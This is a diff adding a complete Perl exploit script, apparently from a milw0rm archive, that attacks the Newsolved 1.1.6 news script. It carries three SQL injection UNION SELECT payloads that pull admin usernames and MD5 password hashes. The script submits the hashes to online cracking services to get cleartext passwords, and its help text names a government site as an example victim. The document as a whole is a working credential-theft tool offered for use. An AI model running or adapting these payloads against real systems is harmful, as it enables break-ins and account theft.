@@ -1,0 +1,260 @@
+#!/usr/bin/perl -w
+# Neversolved.pl
+#
+# Copyright (c) 2009 by <jmp-esp.net>
+#
+# A simple login grabber
+# by lama - 06/23/2009
+#
+# Tested on: Newsolved 1.1.6
+
+use strict;
+use LWP::UserAgent;
+use Getopt::Std;
+use vars qw/ %opt /;
+getopts( "i:p:u:lfh", \%opt );
+
+my @bugs =
+(
+    [
+         "newsscript.php?m=archive&jahr=0'+UnIoN+SeLeCt+CoNcAt('1',':',user,':',pw)+FrOm+[PRE"
+        ."FIX]_intern_users+WhErE+id='[USERID]&jahr_check=ok",
+         "monat_num=1:(.*?):([a-f0-9]{32})"
+    ],
+    [
+         "newsscript.php?m=archive&topic_check=ok&idneu=-1'+UnIoN+SeLeCt+3,CoNcAt(user,':',pw"
+        ."),1,4,1,5,9,2,6,5,3,5,8,9,7,9,3,2,3,8+FrOm+[PREFIX]_intern_users+WhErE+id='[USERID]",
+         "([^>]+):([a-f0-9]{32})<" 
+    ],
+    [
+         "newsscript.php?mailto=ok&newsid=-1'+UnIoN+SeLeCt+1,CoNcAt(user,':',pw),6,1,8,0,3,3,"
+        ."9,8,8,7,4,9,8,9,4,8,4,8+FrOm+[PREFIX]_intern_users+WhErE+id='[USERID]",
+         "<i>(.*?):([a-f0-9]{32})<\/i>" 
+    ]
+);
+
+my @lookups =
+(
+    [
+        'http://md5.rednoize.com/?q=[HASH]&s=md5&go=Search',
+        '',
+        '<div id="result" >(.*?)</div>'
+    ],
+    [
+        'http://milw0rm.com/cracker/search.php',
+        'hash=[HASH]&Submit=Submit',
+        '>[a-f0-9]{32}</TD><TD align="middle" nowrap="nowrap" width=90>(.*?)</TD>'
+    ],
+    [
+        'http://securitystats.com/tools/hashcrack.php',
+        'inputhash=[HASH]&type=MD5&Submit=Submit',
+        '<BR>[a-f0-9]{32} = (.*?)</td>'
+    ],
+    [
+        'http://md5decrypter.com/index.php',
+        'hash=[HASH]&submit=Decrypt',
+        '<b class=\'red\'>Normal Text: </b>(.*?)\n'
+    ]
+);
+
+sub isHost
+{
+    my $target = shift;
+    if ( $target =~ /(?:http:\/\/)?([\w\.\-\_]*)(\/.*)?/ )
+    {
+        my $host = $1;
+        my $folder = ( $2 ? $2 : '/' );
+        if ( $folder !~ /\/$/ ) 
+        { 
+            $folder .= '/';
+        }
+        return "http://$host$folder"; 
+    }
+    else
+    { 
+        return 0;
+    }
+}
+
+sub replacePlaceholder
+{
+    my $search = shift;
+    my $replace = shift;
+    my $placeholder = shift;
+    $search=~s/\[$placeholder\]/$replace/g; 
+    return $search;
+}
+
+sub isVulnerable
+{
+    my $target = shift;
+    my $ua = LWP::UserAgent->new;
+    my $request = new HTTP::Request('GET', $target); 
+    $request->header('User-Agent' => $opt{u});
+    my $response = $ua->request($request);
+    my $body = $response->content;
+    if ($body =~ /mysql_fetch_object/)
+    {
+        return 1;
+    }
+    elsif (!($body =~ /styles_output\.css/))
+    {
+        return 0;    
+    }
+    else
+    {
+        return -1;
+    }
+}
+
+sub getHash
+{
+    my $target = shift;
+    my $regexp = shift;
+    my $ua = LWP::UserAgent->new;
+    my $request = new HTTP::Request('GET', $target); 
+    $request->header('User-Agent' => $opt{u});
+    my $response = $ua->request($request);
+    my $body = $response->content;
+    if ($body =~ /$regexp/)
+    {
+        return ($1, $2);
+    }
+    else
+    {
+        return 0;    
+    }
+}
+
+sub searchPlaintext
+{
+    my $hash = shift;
+    foreach (@lookups)
+    {
+        my $server = replacePlaceholder(@$_[0], $hash, "HASH");
+        my $post = replacePlaceholder(@$_[1], $hash, "HASH");
+        my $ua = LWP::UserAgent->new;
+        my $request = new HTTP::Request('POST', $server); 
+        $request->content("$post"); 
+        $request->content_type('application/x-www-form-urlencoded');
+        $request->header('Referer' => $server);
+        $request->header('User-Agent' => $opt{u});
+        my $response = $ua->request($request);
+        my $body = $response->content;
+        if ($body =~ /@$_[2]/)
+        {
+            return $1;
+        }
+
+    }
+    return 0;
+}
+
+sub attackTarget
+{
+    my $target = shift;
+    my $userid = shift;
+    foreach (@bugs)
+    {
+        my $bug = @$_[0];
+        $bug = replacePlaceholder($bug, $userid, "USERID");
+        $bug = replacePlaceholder($bug, $opt{p}, "PREFIX");
+        (my $username, my $password) = getHash($target.$bug, @$_[1]);
+        if (($username) && ($password))
+        {
+            return ($username, $password);
+        }
+    }
+    return 0;
+}
+
+sub showHelp
+{
+    print "Newsolved <= 1.1.6 Sploiter ( jmp-esp.net )\n"
+        . "Usage: $0 [options] Victim\n"
+        . "OPTIONS\n"
+        . " -i integer: Userid [1]\n"
+        . " -u string: Useragent [IE]\n"
+        . " -p string: Prefix [newsolved]\n"
+        . " -f: Force [optional]\n"
+        . " -l: Lookup [optional]\n"
+        . " -h: Help [optional]\n"
+        . "EXAMPLES\n"
+        . " ./$0 http://pentagon.gov/news/\n"
+        . " ./$0 -f -i 4 http://omnomnom.com/\n"
+        . "OTHER\n"
+        . " Magic_Quotes_GPC needs to be off\n";
+}
+
+sub showBanner
+{
+    print "  __                                          \n"
+        . " |__|.--------.-----.______.-----.-----.-----.\n"
+        . " |  ||        |  _  |______|  -__|__ --|  _  |\n"
+        . " |  ||__|__|__|   __|      |_____|_____|   __|\n"
+        . "|___|         |__|    lama  06/23/2009 |__|   \n"
+        . "Kampfgeschrei!\n\n";    
+}
+
+if ($opt{h})
+{
+    showHelp();
+    exit;
+}
+
+my $victim = shift;
+if (!($victim) || !($victim = isHost($victim)))
+{
+    showHelp();
+    exit;    
+}
+
+$opt{u} = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' if (!$opt{u});
+$opt{i} = '1' if (!$opt{i});
+$opt{p} = 'newsolved' if (!$opt{p});
+
+if (scalar(@bugs) < 1)
+{
+    print "Bugs or gtfo. Srsly.\n";
+    exit;
+}
+
+my $vulnerability = isVulnerable($victim.$bugs[0][0]);
+if ($vulnerability == 0)
+{
+    print "This doesn't look like Newsolved. Read the help, now.\n\n";
+    showHelp();
+    exit if (!$opt{f});
+}
+elsif ($vulnerability == -1)
+{
+    print "Magic_Quotes_Gpc seems to be on. Read the help, now.\n\n";
+    showHelp();
+    exit if (!$opt{f});
+}
+
+showBanner();
+(my $username, my $password) = attackTarget($victim, $opt{i});
+if ($username)
+{
+    print "Target:\t\t".isHost($victim)." ( ID: ".$opt{i}." )\n";
+    print "Username:\t$username\nPassword:\t$password\n";
+    if ($opt{l})
+    {
+        my $cleartext = searchPlaintext($password);
+        if ($cleartext)
+        {
+            print "Cleartext:\t$cleartext\n";
+        }
+        else
+        {
+            print "Cleartext:\tNot found\n";
+        }
+    }
+}
+else
+{
+    print "Unable to retrieve the password: Is the userid correct?\n";
+}
+
+# milw0rm.com [2009-06-29]
